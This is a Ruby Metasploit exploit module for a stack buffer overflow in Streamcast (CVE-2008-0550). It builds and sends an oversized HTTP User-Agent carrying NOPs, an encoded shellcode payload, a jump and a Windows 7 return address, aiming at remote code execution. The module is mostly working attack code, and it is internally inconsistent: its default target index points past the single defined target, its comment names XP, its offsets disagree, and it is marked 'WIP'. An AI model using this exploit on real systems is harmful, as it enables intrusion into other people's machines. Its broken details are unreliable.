##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Streamcast HTTP User-Agent Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack buffer overflow in Streamcast <= 0.9.75. By sending
          an overly long User-Agent in an HTTP GET request, an attacker may be able to
          execute arbitrary code.
      },
      'Author'         => 	[
              'LSO <lso[at]hushmail.com>', # Original exploit module
              'aushack' # Added references and check code. Default target to XP.
            ],
      'License'        => BSD_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2008-0550' ],
          [ 'OSVDB', '42670' ],
          [ 'URL', 'http://aluigi.altervista.org/adv/steamcazz-adv.txt'],
          [ 'BID', '33898' ],
        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
          'AllowWin32SEH' => true
        },
      'Payload'        =>
				{
          'Space'       => 750,
					'BadChars'    => "\x00\x0A\x0D\xFF", # https://resources.infosecinstitute.com/topic/stack-based-buffer-overflow-in-win-32-platform-part-6-dealing-with-bad-characters-jmp-instruction/
				},
      'Platform'       => 'win',
      'Targets'        =>
				[
					[ 'Windows 7', 	{ 'Ret' => 0x6fc66d71, 'Offset' => 2048 } ] , 
				],
      'DisclosureDate' => '2008-01-24',
      'DefaultTarget' => 1))

      register_options([ Opt::RPORT(80) ], self)
  end

  def exploit
    connect

    juju =  "GET / HTTP/1.0\r\n"
    juju << "User-Agent: " + make_nops(1008 - payload.encoded.length)
    juju << payload.encoded + Rex::Arch::X86.jmp_short(6) + make_nops(2)
    juju << [ target.ret ].pack('V') + [0xe8, -850].pack('CV')
    juju <<  rand_text_alpha_upper(275)

    print_status("Trying target #{target.name}...")
    sock.put(juju + "\r\n\r\n")

    handler
    disconnect
  end
end


# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/steamcast_useragent.rb
# https://www.exploit-db.com/exploits/36421
# https://www.exploit-db.com/exploits/16802
# WIP

